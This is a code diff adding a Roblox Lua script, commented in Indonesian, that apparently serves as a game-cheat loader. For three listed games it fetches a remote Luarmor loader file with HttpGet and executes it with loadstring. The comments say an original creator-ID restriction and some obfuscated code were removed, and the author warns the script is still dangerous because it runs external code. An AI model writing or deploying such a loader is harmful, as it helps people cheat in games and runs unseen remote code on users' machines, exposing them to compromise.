@@ -1,0 +1,54 @@
+--[[
+    Skrip yang dimodifikasi ini:
+    1.  Menghapus pemeriksaan CreatorTargetId yang membatasi eksekusi.
+    2.  Tetap mengunduh kode dari GitHub berdasarkan PlaceId.
+    3.  Lebih rapi dan terstruktur.
+    4.   Menyertakan CreatorTargetId tapi tidak difungsikan.
+
+    PERINGATAN: Skrip ini MASIH BERBAHAYA karena mengunduh dan menjalankan
+                 kode dari sumber eksternal (GitHub).
+]]
+
+-- Tunggu game selesai dimuat (praktik yang baik).
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+-- Dapatkan CreatorTargetId (TAPI TIDAK DIGUNAKAN UNTUK KONTROL EKSEKUSI)
+local creatorId = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Creator.CreatorTargetId
+
+-- Dapatkan PlaceId (ID game) saat ini.
+local placeId = game.PlaceId
+
+-- Tabel yang memetakan PlaceId ke URL skrip di GitHub atau server lain.
+local gameScripts = {
+    [7381705]  = 'https://api.luarmor.net/files/v3/loaders/f6c9f276f7d6a7dd6edfd0173d7a211d.lua', -- Fisch
+    [34671275] = 'https://api.luarmor.net/files/v3/loaders/68dca2660c852ebceccd3196b8cbc465.lua', -- BLR
+    [11867394] = 'https://api.luarmor.net/files/v3/loaders/725ce097c244a8e5ee7cd4625820718a.lua', -- DR
+    -- Tambahkan entri lain di sini untuk game lain yang "didukung".
+    -- [ID_GAME_LAIN] = 'URL_KE_SKRIP_BERBAHAYA',
+}
+
+-- Periksa apakah PlaceId saat ini ada dalam daftar gameScripts.
+if gameScripts[placeId] then
+    -- PlaceId ditemukan, unduh dan jalankan skrip.
+    local scriptUrl = gameScripts[placeId]
+    local scriptContent = game:HttpGet(scriptUrl)  -- Unduh skrip dari URL.
+
+    -- Periksa apakah game:HttpGet berhasil
+    if scriptContent and scriptContent ~= "" then
+       loadstring(scriptContent)()  -- Jalankan skrip yang diunduh.
+       --print("Exploit loaded successfully for PlaceId:", placeId) -- Opsional: Cetak pesan sukses
+    else
+        warn("Failed to download script for PlaceId:", placeId)
+    end
+
+
+else
+    -- PlaceId tidak ditemukan, beri peringatan.
+    warn("Unsupported game. PlaceId:", placeId, "CreatorId:", creatorId)
+end
+
+
+-- Hapus kode ter-obfuscate, karena tidak diperlukan lagi.
+-- Kode ter-obfuscate itu bergantung pada pemeriksaan creatorId, yang sudah dihapus.
